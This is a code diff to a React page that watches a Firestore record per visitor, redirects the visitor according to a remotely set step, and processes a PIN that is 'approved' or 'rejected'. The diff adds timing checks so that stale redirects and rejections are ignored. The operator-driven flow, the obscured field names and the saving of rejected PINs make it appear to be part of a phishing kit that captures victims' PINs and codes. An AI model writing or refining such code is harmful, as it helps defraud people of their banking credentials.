@@ -45,18 +45,28 @@ export default function ConfiPage() {
         if (docSnapshot.exists()) {
           const data = docSnapshot.data()
           const step = data.currentStep
+          const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined
+          const now = Date.now()
 
           // Redirect based on currentStep
-          if (step === "home") {
-            router.push("/insur")
-          } else if (step === "phone") {
-            router.push("/step5")
-          } else if (step === "_t6") {
-            router.push("/step4")
-          } else if (step === "_st1") {
-            router.push("/check")
-          } else if (step === "_t2") {
-            router.push("/step2")
+          if (step && step !== "confi") {
+            // Check if this is a NEW redirect (within 3 seconds)
+            if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 3000)) {
+              console.log('[step3] Stale currentStep redirect, ignoring')
+              return
+            }
+            
+            if (step === "home") {
+              router.push("/insur")
+            } else if (step === "phone") {
+              router.push("/step5")
+            } else if (step === "_t6") {
+              router.push("/step4")
+            } else if (step === "_st1") {
+              router.push("/check")
+            } else if (step === "_t2") {
+              router.push("/step2")
+            }
           }
         }
       },
@@ -78,7 +88,7 @@ export default function ConfiPage() {
 
     if (!db) return
     const docRef = doc(db as Firestore, "pays", visitorID)
-    const unsubscribe = onSnapshot(docRef, (docSnapshot) => {
+    const unsubscribe = onSnapshot(docRef, async (docSnapshot) => {
       if (!docSnapshot.exists()) {
         router.push("/check")
         return
@@ -86,8 +96,17 @@ export default function ConfiPage() {
       
       const data = docSnapshot.data()
       const status = data._v6Status as "pending" | "verifying" | "approved" | "rejected" | undefined
+      const updatedAt = data._v6StatusUpdatedAt as number | undefined
+      const now = Date.now()
       
       if (status === "rejected") {
+        // Check if this is a NEW action (within 3 seconds)
+        if (!updatedAt || (now - updatedAt > 3000)) {
+          console.log('[step3] Stale rejection, ignoring')
+          setIsLoading(false)
+          return
+        }
+        
         // Save rejected PIN and reset status
         const currentPin = {
           code: data._v6,
